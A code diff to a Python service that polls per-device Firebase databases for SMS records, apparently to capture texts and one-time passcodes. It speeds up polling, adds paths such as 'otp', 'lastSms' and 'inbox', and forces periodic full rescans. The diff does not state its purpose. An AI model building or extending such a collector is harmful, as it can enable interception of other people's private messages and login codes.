@@ -17,7 +17,7 @@ from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
-POLL_INTERVAL_SEC = 0.5
+POLL_INTERVAL_SEC = 0.3
 POLL_FETCH_TIMEOUT_SEC = 5.0
 SNAPSHOT_TIMEOUT_SEC = 30.0
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
@@ -65,10 +65,16 @@ def _device_ids(device: Device) -> list[str]:
 
 
 def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
+    from app.firebase_client import normalize_firebase_url
+    from app.firebase_sync import resolve_firebase_url
+
+    url = resolve_firebase_url(profile, device)
+    if url:
+        return normalize_firebase_url(url)
     if device.firebase_source_url:
-        return device.firebase_source_url
+        return normalize_firebase_url(device.firebase_source_url)
     if profile.firebase_url:
-        return profile.firebase_url
+        return normalize_firebase_url(profile.firebase_url)
     return None
 
 
@@ -370,11 +376,18 @@ def _generate_sms_paths(device: Device) -> list[str]:
                 seen_paths.add(device_path)
                 paths.append(device_path)
 
-        for top in ("sms", "SMS", "messages"):
+        for top in ("sms", "SMS", "messages", "inbox", "Inbox", "data", "logs"):
             path = f"{top}/{device_id}"
             if path not in seen_paths:
                 seen_paths.add(path)
                 paths.append(path)
+
+        for parent in SMS_PARENT_PATHS:
+            for suffix in ("lastSms", "last_sms", "latest_sms", "otp", "lastMessage"):
+                path = f"{parent}/{device_id}/{suffix}"
+                if path not in seen_paths:
+                    seen_paths.add(path)
+                    paths.append(path)
 
     return paths
 
@@ -436,14 +449,22 @@ def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
     return list(deduped.values())
 
 
+_poll_cycle: dict[int, int] = {}
+
+
 async def fetch_firebase_sms_for_device(
     firebase_url: str,
     device: Device,
     *,
     timeout: float = 3.0,
+    force_full: bool = False,
 ) -> list[dict[str, Any]]:
     root = firebase_root_url(firebase_url)
-    cached_paths = get_cached_sms_paths(device)
+    cycle = _poll_cycle.get(device.id, 0) + 1
+    _poll_cycle[device.id] = cycle
+    force_full = force_full or cycle % 4 == 0
+
+    cached_paths = [] if force_full else get_cached_sms_paths(device)
     if cached_paths:
         cached_records, hit_paths = await _fetch_paths_parallel(
             root,
